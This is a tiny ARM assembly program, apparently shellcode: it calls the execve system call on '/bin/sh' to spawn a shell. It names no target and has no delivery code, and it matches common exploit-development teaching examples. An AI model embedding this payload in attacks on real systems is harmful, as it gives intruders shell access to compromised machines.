	.section .text
	
	.global _start
	
	_start: 
	adr r0, binsh
	mov r1, #0
	mov r2, #0
	mov r7, #11
	svc #0
	
	binsh:
	.ascii "/bin/sh\0"